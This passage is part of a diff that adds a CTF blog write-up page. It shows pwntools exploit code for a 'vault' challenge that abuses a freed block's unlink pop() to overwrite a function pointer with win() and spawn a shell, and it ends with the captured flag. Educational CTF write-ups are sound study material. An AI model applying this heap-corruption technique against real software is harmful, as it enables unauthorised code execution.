+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># edit the vault</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># block-&gt;next is at offset 0, block-&gt;pprev is at offset 8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pop() writes the value of `block-&gt;next` to the address given by `block-&gt;pprev`</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># address of vault_functions[0], aka the pointer to win(), is written to fp</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x405710</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x405708</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div>
+
+
+    <blockquote class="alert alert-caution">
+        <p class="alert-heading">
+            ❗
+            <b>
+                
+                    Caution
+                
+            </b>
+        </p>
+        <p>A second write occurs in the function with the line <code>block-&gt;next-&gt;pprev = block-&gt;pprev</code>.
+If <code>block-&gt;next-&gt;pprev</code> happens to be a non-writable memory address, the binary will crash.</p>
+    </blockquote>
+<p>Then, we need to allocate a new block via <code>allocate_new_vault()</code> to trigger the exploit. <code>fp</code> will be successfully overwritten. Finally, we can simply run <code>send_notification()</code> to get a shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># allocate_new_vault to trigger pop() to run, aka have win() be written to fp</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># run send_notification() -&gt; win()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><figure>
+    <img src="assets/vault_2.png">
+    <figcaption>freed block has been edited</figcaption>
+</figure>
+<figure>
+    <img src="assets/vault_3.png">
+    <figcaption>fp & vault_functions have been overwritten</figcaption>
+</figure>
+<p>Flag: <code>Breach{m4g1c_u4f_70_v4u17_c0n7r01}</code></p>
+
+      </div>
+      <br>
+    </article>
+
+    <hr />
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://enxgmatic.github.io/blog/gctf-quals24/">
+                    <span class="button__text">Grey Cat The Flag Quals 2024</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    <div id="comments" class="thin"></div>
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer id="site-footer" class="section-inner thin animated fadeIn faster footer">
+	<p>
+		&copy; 2025 enxgmatic
+		
+		&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
+		&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hello Friend NG</a>
+		
+		
+		
+	</p>
+
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.5dec718db360369f6c53d6a74eb9396d4a6ae9407b4857a7d7a02fc1a475bc7264af31658e86eeef5799dacd109c6b4bcae61c64772423ae9ef2ee502bf8d8ec.js" integrity="sha512-XexxjbNgNp9sU9anTrk5bUpq6UB7SFen16AvwaR1vHJkrzFljobu71eZ2s0QnGtLyuYcZHckI66e8u5QK/jY7A=="></script>
+
+
+
+
+    </body>
+</html>
